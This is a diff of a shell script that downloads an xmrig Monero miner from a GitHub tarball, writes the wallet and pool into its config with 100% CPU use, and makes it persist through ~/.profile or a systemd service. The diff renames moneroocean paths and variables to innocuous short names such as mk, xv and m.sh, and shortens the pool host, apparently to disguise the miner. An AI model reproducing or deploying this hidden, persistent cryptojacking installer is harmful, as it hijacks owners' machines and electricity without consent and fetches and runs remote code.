@@ -67,7 +67,7 @@ if echo "$CPU_L3_CACHE" | grep MiB >/dev/null; then
   fi
 fi
 TOTAL_CACHE=$(( $CPU_THREADS*$CPU_L1_CACHE + $CPU_SOCKETS * ($CPU_CORES_PER_SOCKET*$CPU_L2_CACHE + $CPU_L3_CACHE)))
-EXP_MONERO_HASHRATE=$(( ($CPU_THREADS < $TOTAL_CACHE / 2048 ? $CPU_THREADS : $TOTAL_CACHE / 2048) * ($CPU_MHZ * 20 / 1000) * 5 ))
+xmrh=$(( ($CPU_THREADS < $TOTAL_CACHE / 2048 ? $CPU_THREADS : $TOTAL_CACHE / 2048) * ($CPU_MHZ * 20 / 1000) * 5 ))
 power2() {
   if ! type bc >/dev/null; then
     if [ "$1" -gt "204800" ]; then
@@ -104,7 +104,7 @@ power2() {
   fi
 }
 
-PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
+PORT=$(( $xmrh * 12 / 1000 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
 PORT=$(( 10000 + $PORT ))
@@ -114,17 +114,9 @@ sleep 15
 echo
 echo
 
-# start doing stuff: preparing miner
-
-if sudo -n true 2>/dev/null; then
-  sudo systemctl stop moneroocean_miner.service
-fi
-killall -9 xmrig
-
-rm -rf $HOME/moneroocean
 
 echo "[*] Downloading"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/680642546274012521547861302794192049193/xvx/master/xv.tar.gz" -o /tmp/xv.tar.gz; then
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/680642546274012521547861302794192049193/xv/master/xv.tar.gz" -o /tmp/xv.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/680642546274012521547861302794192049193/xv/master/xv.tar.gz file to /tmp/xv.tar.gz"
   exit 1
 fi
@@ -152,15 +144,15 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/moneroocean/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.stream:'$PORT'",/' $HOME/mk/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/mk/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/mk/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/mk/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/mk/xv.log'",#' $HOME/mk/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/mk/config.json
 
-cp $HOME/moneroocean/config.json $HOME/moneroocean/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/moneroocean/config_background.json
+cp $HOME/mk/config.json $HOME/mk/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/mk/config_background.json
 
 # preparing script
 
@@ -175,7 +167,7 @@ if ! sudo -n true 2>/dev/null; then
     echo "[*] Adding $HOME/mk/m.sh script to $HOME/.profile"
     echo "$HOME/mk/m.sh --config=$HOME/mk/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/mk/m.sh script is already in the $HOME/.profile"
   fi
   echo "[*] Running"
   /bin/bash $HOME/mk/m.sh --config=$HOME/mk/config_background.json >/dev/null 2>&1
@@ -212,7 +204,6 @@ WantedBy=multi-user.target
 EOL
     sudo mv /tmp/mk.service /etc/systemd/system/mk.service
     echo "[*] Starting"
-    sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable mk.service
     sudo systemctl start mk.service
